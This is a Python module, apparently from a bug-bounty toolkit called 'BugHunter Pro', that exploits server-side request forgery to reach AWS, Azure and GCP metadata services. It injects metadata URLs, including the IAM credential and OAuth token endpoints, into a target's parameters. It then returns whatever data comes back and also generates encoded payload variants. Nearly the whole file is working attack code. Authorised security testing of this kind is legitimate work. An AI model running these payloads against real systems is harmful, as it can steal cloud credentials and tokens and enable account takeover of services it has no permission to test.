#!/usr/bin/env python3
"""
Cloud Metadata Scanner for BugHunter Pro
Tests for AWS, Azure, and GCP metadata endpoint access via SSRF
"""

import requests
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urljoin

logger = logging.getLogger(__name__)


@dataclass
class CloudMetadataFinding:
    """Cloud metadata finding"""
    cloud_provider: str
    endpoint: str
    accessible: bool
    response_data: Optional[str]
    severity: str
    description: str


class CloudMetadataScanner:
    """Scanner for cloud metadata endpoints"""
    
    # AWS EC2 metadata endpoints
    AWS_ENDPOINTS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
    ]
    
    # Azure metadata endpoints
    AZURE_ENDPOINTS = [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ]
    
    # GCP metadata endpoints
    GCP_ENDPOINTS = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ]
    
    def __init__(self, timeout: int = 5):
        """
        Initialize cloud metadata scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
    
    def test_ssrf_to_metadata(
        self,
        target_url: str,
        param: str,
        method: str = 'GET'
    ) -> List[CloudMetadataFinding]:
        """
        Test SSRF vulnerability to cloud metadata endpoints
        
        Args:
            target_url: Target URL with SSRF vulnerability
            param: Parameter name to inject metadata URL
            method: HTTP method (GET or POST)
        
        Returns:
            List of findings
        """
        findings = []
        
        logger.info(f"Testing SSRF to cloud metadata via {param}")
        
        # Test AWS endpoints
        for endpoint in self.AWS_ENDPOINTS:
            finding = self._test_endpoint(
                target_url,
                param,
                endpoint,
                'AWS',
                method
            )
            if finding:
                findings.append(finding)
        
        # Test Azure endpoints
        for endpoint in self.AZURE_ENDPOINTS:
            finding = self._test_endpoint(
                target_url,
                param,
                endpoint,
                'Azure',
                method,
                headers={'Metadata': 'true'}
            )
            if finding:
                findings.append(finding)
        
        # Test GCP endpoints
        for endpoint in self.GCP_ENDPOINTS:
            finding = self._test_endpoint(
                target_url,
                param,
                endpoint,
                'GCP',
                method,
                headers={'Metadata-Flavor': 'Google'}
            )
            if finding:
                findings.append(finding)
        
        return findings
    
    def _test_endpoint(
        self,
        target_url: str,
        param: str,
        metadata_url: str,
        provider: str,
        method: str = 'GET',
        headers: Optional[Dict[str, str]] = None
    ) -> Optional[CloudMetadataFinding]:
        """Test a single metadata endpoint"""
        try:
            if method.upper() == 'GET':
                params = {param: metadata_url}
                response = self.session.get(
                    target_url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=True,
                    headers=headers or {}
                )
            else:
                data = {param: metadata_url}
                response = self.session.post(
                    target_url,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=True,
                    headers=headers or {}
                )
            
            # Check if response contains metadata
            if self._is_metadata_response(response.text, provider):
                severity = 'CRITICAL' if 'credentials' in metadata_url or 'token' in metadata_url else 'HIGH'
                
                return CloudMetadataFinding(
                    cloud_provider=provider,
                    endpoint=metadata_url,
                    accessible=True,
                    response_data=response.text[:500],  # Truncate
                    severity=severity,
                    description=f"SSRF allows access to {provider} metadata endpoint"
                )
        
        except requests.exceptions.RequestException:
            pass
        
        return None
    
    def _is_metadata_response(self, response_text: str, provider: str) -> bool:
        """Check if response contains cloud metadata"""
        indicators = {
            'AWS': ['ami-id', 'instance-id', 'iam', 'security-credentials', 'instance-type'],
            'Azure': ['compute', 'network', 'vmId', 'subscriptionId', 'resourceGroupName'],
            'GCP': ['project-id', 'instance-id', 'service-accounts', 'attributes', 'hostname']
        }
        
        text_lower = response_text.lower()
        
        for indicator in indicators.get(provider, []):
            if indicator.lower() in text_lower:
                return True
        
        return False
    
    def detect_cloud_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """
        Detect cloud provider from HTTP headers
        
        Args:
            headers: HTTP response headers
        
        Returns:
            Cloud provider detection results
        """
        cloud_indicators = {
            'AWS': [
                'x-amz-request-id',
                'x-amz-id-2',
                'x-amzn-requestid',
                'x-amzn-trace-id'
            ],
            'Azure': [
                'x-ms-request-id',
                'x-ms-version',
                'x-ms-correlation-request-id'
            ],
            'GCP': [
                'x-goog-request-id',
                'x-goog-generation',
                'x-guploader-uploadid'
            ],
            'Cloudflare': [
                'cf-ray',
                'cf-cache-status',
                'cf-request-id'
            ]
        }
        
        detected = {}
        
        for provider, indicators in cloud_indicators.items():
            for header_name in headers.keys():
                if header_name.lower() in [ind.lower() for ind in indicators]:
                    detected[provider] = {
                        'detected': True,
                        'header': header_name,
                        'value': headers[header_name]
                    }
                    break
        
        return detected
    
    def test_direct_metadata_access(self) -> List[CloudMetadataFinding]:
        """
        Test direct access to metadata endpoints (for testing purposes)
        
        Returns:
            List of accessible endpoints
        """
        findings = []
        
        logger.info("Testing direct metadata endpoint access...")
        
        # Test AWS
        for endpoint in self.AWS_ENDPOINTS[:2]:  # Test first 2 only
            try:
                response = requests.get(endpoint, timeout=2)
                if response.status_code == 200:
                    findings.append(CloudMetadataFinding(
                        cloud_provider='AWS',
                        endpoint=endpoint,
                        accessible=True,
                        response_data=response.text[:200],
                        severity='CRITICAL',
                        description='Running on AWS EC2 instance'
                    ))
            except:
                pass
        
        # Test Azure
        for endpoint in self.AZURE_ENDPOINTS[:1]:
            try:
                response = requests.get(
                    endpoint,
                    headers={'Metadata': 'true'},
                    timeout=2
                )
                if response.status_code == 200:
                    findings.append(CloudMetadataFinding(
                        cloud_provider='Azure',
                        endpoint=endpoint,
                        accessible=True,
                        response_data=response.text[:200],
                        severity='CRITICAL',
                        description='Running on Azure VM'
                    ))
            except:
                pass
        
        # Test GCP
        for endpoint in self.GCP_ENDPOINTS[:2]:
            try:
                response = requests.get(
                    endpoint,
                    headers={'Metadata-Flavor': 'Google'},
                    timeout=2
                )
                if response.status_code == 200:
                    findings.append(CloudMetadataFinding(
                        cloud_provider='GCP',
                        endpoint=endpoint,
                        accessible=True,
                        response_data=response.text[:200],
                        severity='CRITICAL',
                        description='Running on GCP Compute Engine'
                    ))
            except:
                pass
        
        return findings
    
    def generate_ssrf_payloads(self, base_url: Optional[str] = None) -> List[str]:
        """
        Generate SSRF payloads for cloud metadata
        
        Args:
            base_url: Optional base URL to wrap payloads
        
        Returns:
            List of SSRF payloads
        """
        payloads = []
        
        # AWS payloads
        payloads.extend(self.AWS_ENDPOINTS)
        
        # Azure payloads
        payloads.extend(self.AZURE_ENDPOINTS)
        
        # GCP payloads
        payloads.extend(self.GCP_ENDPOINTS)
        
        # Add variations
        variations = []
        for payload in payloads:
            # Add @  variations
            variations.append(f"http://@{payload.replace('http://', '')}")
            # Add URL-encoded
            variations.append(payload.replace(':', '%3A').replace('/', '%2F'))
        
        payloads.extend(variations)
        
        return payloads


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    print("\n" + "="*70)
    print("Cloud Metadata Scanner Demo")
    print("="*70)
    
    scanner = CloudMetadataScanner()
    
    # Test if running on cloud
    print("\n☁️  Testing if running on cloud infrastructure...\n")
    
    findings = scanner.test_direct_metadata_access()
    
    if findings:
        print(f"✅ Detected cloud environment:")
        for finding in findings:
            print(f"  Provider: {finding.cloud_provider}")
            print(f"  Endpoint: {finding.endpoint}")
            print(f"  Accessible: {finding.accessible}")
            print(f"  Data Preview: {(finding.response_data or '')[:100]}...")
    else:
        print("ℹ️  Not running on AWS/Azure/GCP (or metadata service not accessible)")
    
    # Generate SSRF payloads
    print("\n\n🎯 Sample SSRF Payloads for Cloud Metadata:\n")
    payloads = scanner.generate_ssrf_payloads()
    
    print("AWS Payloads:")
    for p in [p for p in payloads if '169.254.169.254' in p and 'api-version' not in p][:3]:
        print(f"  {p}")
    
    print("\nAzure Payloads:")
    for p in [p for p in payloads if 'api-version' in p][:2]:
        print(f"  {p}")
    
    print("\nGCP Payloads:")
    for p in [p for p in payloads if 'google' in p.lower()][:3]:
        print(f"  {p}")
    
    print("\n💡 Use these payloads to test SSRF vulnerabilities")
